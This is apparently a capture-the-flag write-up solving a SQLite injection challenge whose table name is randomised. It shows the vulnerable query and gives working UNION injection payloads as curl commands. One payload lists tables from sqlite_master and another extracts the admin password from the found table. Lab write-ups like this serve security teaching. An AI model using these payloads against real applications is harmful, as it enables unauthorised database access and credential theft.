# SQL Injection 4

In this challenge, we are given a user query service. We are given only 1 GET endpoint, that will read a query parameter
and inject into an SQL statement. Previously, we knew what that the table `users` held the username and password relationship.
This time, the developer of the server obfuscates the name of the table like so:

```python
random_user_table = f"users_{random.randrange(2**32, 2**33)}"
db.execute(f"""CREATE TABLE {random_user_table} AS SELECT "admin" AS username, ? as password""", [open("/flag").read()])
db.execute(f"""INSERT INTO {random_user_table} SELECT "guest" as username, "password" as password""")
```

We are given the same vulnerable sql input:

```python
sql = f'SELECT username FROM {random_user_table} WHERE username LIKE "{query}"'
```

In sqlite databases, there is usually a master table that stores the schema metadata for the entire database file.
In newer sqlite databases, that th=able is called `sqlite_schema`. In older implementations, they are called `sqlite_master`.

Let's use a query to extract the table information:

```sql
SELECT username FROM {random_user_table} WHERE username LIKE "admin" UNION SELECT name FROM sqlite_master WHERE type="table"
                                                              ^ control from here
```
The type `table` are for tables that are in the database. Other types include `index`, `view`, `trigger`, etc but we won't get into those here.
This is the payload for the above:

```bash
curl -G --data-urlencode 'query=admin" UNION SELECT name FROM sqlite_master WHERE type = "table' 'challenge.localhost:80/' -b cookie.txt
```

Anyways, this will return us the name of the table! Now, you can do the same attack as the previous challenge to extrac the flag from the database:

```bash
curl -G --data-urlencode 'query=admin" UNION SELECT password FROM users_6107457403 WHERE username="admin' 'challenge.localhost:80/' -b cookie.txt
```

The html response includes the flag!

P.S. I thought there was a way to do this in one query like so:

```sql
SELECT username FROM {random_user_table} WHERE username LIKE "admin" UNION SELECT name FROM (SELECT name FROM sqlite_master WHERE type="table") WHERE username="admin"
```

I tried this and it didn't work. This is because the subquery returning the table name doesn't make SQLite treat that string as a table identifier.
So if you guys know of a way to do this in one query, let me know!